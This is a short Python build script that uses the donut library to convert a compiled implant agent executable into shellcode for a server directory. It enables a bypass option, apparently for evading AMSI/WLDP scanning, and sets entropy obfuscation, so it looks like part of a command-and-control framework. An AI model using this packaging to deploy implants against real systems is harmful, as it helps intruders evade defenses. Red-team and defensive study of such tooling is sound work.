import donut


def main():
    donut.gen(
        file="implant/Agent/bin/Release/Agent.exe",
        arch=2,
        bypass=3,
        entropy=3,
        exit_opt=1,
        output="server/agent.bin",
    )


if __name__ == "__main__":
    main()
